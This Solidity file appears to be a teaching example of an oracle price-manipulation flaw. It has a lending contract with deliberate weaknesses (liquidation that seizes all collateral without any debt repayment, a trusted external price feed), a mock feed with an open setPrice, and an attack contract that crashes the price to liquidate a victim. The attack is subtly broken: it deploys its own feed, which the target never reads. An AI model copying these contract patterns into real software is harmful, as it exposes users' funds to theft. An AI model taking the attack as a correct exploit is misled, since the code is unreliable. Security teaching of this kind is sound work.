// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title PriceManipulationVulnerable
 * @dev A simplified DeFi contract that demonstrates price manipulation vulnerabilities
 */
contract PriceManipulationVulnerable {
    address public owner;
    address public priceFeed;
    
    mapping(address => uint256) public collateral;
    mapping(address => uint256) public debt;
    
    uint256 public constant LIQUIDATION_THRESHOLD = 150; // 150% collateralization ratio
    
    event Deposit(address indexed user, uint256 amount);
    event Borrow(address indexed user, uint256 amount);
    event Liquidation(address indexed user, address indexed liquidator, uint256 collateralAmount);
    
    constructor(address _priceFeed) {
        owner = msg.sender;
        priceFeed = _priceFeed;
    }
    
    function deposit() external payable {
        collateral[msg.sender] += msg.value;
        emit Deposit(msg.sender, msg.value);
    }
    
    function borrow(uint256 amount) external {
        // Check if user has enough collateral
        uint256 collateralValue = getCollateralValue(msg.sender);
        uint256 newDebt = debt[msg.sender] + amount;
        
        // Require 200% collateralization to borrow
        require(collateralValue >= newDebt * 2, "Insufficient collateral");
        
        debt[msg.sender] = newDebt;
        
        // Transfer borrowed amount to user
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");
        
        emit Borrow(msg.sender, amount);
    }
    
    function liquidate(address user) external {
        // Check if user is undercollateralized
        uint256 healthFactor = getHealthFactor(user);
        
        require(healthFactor < LIQUIDATION_THRESHOLD, "User not liquidatable");
        
        // Transfer collateral to liquidator
        uint256 userCollateral = collateral[user];
        collateral[user] = 0;
        debt[user] = 0;
        
        // Transfer collateral to liquidator
        (bool success, ) = msg.sender.call{value: userCollateral}("");
        require(success, "Transfer failed");
        
        emit Liquidation(user, msg.sender, userCollateral);
    }
    
    function getCollateralValue(address user) public view returns (uint256) {
        // Get ETH price from price feed
        uint256 ethPrice = getEthPrice();
        
        // Calculate collateral value in USD
        return collateral[user] * ethPrice / 1e18;
    }
    
    function getHealthFactor(address user) public view returns (uint256) {
        if (debt[user] == 0) return type(uint256).max;
        
        uint256 collateralValue = getCollateralValue(user);
        return collateralValue * 100 / debt[user];
    }
    
    function getEthPrice() public view returns (uint256) {
        // VULNERABLE: Using an external contract call to get price
        // This can be manipulated by an attacker who controls the price feed
        (bool success, bytes memory data) = priceFeed.staticcall(
            abi.encodeWithSignature("getPrice()")
        );
        require(success, "Price feed call failed");
        
        return abi.decode(data, (uint256));
    }
    
    function setPriceFeed(address _priceFeed) external {
        require(msg.sender == owner, "Only owner");
        priceFeed = _priceFeed;
    }
}

/**
 * @title MockPriceFeed
 * @dev A mock price feed contract for testing
 */
contract MockPriceFeed {
    uint256 public price;
    
    constructor(uint256 _initialPrice) {
        price = _initialPrice;
    }
    
    function getPrice() external view returns (uint256) {
        return price;
    }
    
    function setPrice(uint256 _price) external {
        price = _price;
    }
}

/**
 * @title PriceManipulationAttack
 * @dev An attack contract that exploits the price manipulation vulnerability
 */
contract PriceManipulationAttack {
    PriceManipulationVulnerable public target;
    MockPriceFeed public maliciousPriceFeed;
    
    constructor(address _target) {
        target = PriceManipulationVulnerable(_target);
        
        // Create a malicious price feed
        maliciousPriceFeed = new MockPriceFeed(2000e18); // Initial price: $2000
    }
    
    function attack(address victim) external payable {
        // Step 1: Set up the attack by depositing some collateral
        target.deposit{value: msg.value / 2}();
        
        // Step 2: Manipulate the price feed to make the victim's position liquidatable
        maliciousPriceFeed.setPrice(500e18); // Crash the price to $500
        
        // Step 3: Liquidate the victim
        target.liquidate(victim);
        
        // Step 4: Restore the price
        maliciousPriceFeed.setPrice(2000e18);
        
        // Return funds to the attacker
        payable(msg.sender).transfer(address(this).balance);
    }
    
    receive() external payable {}
}
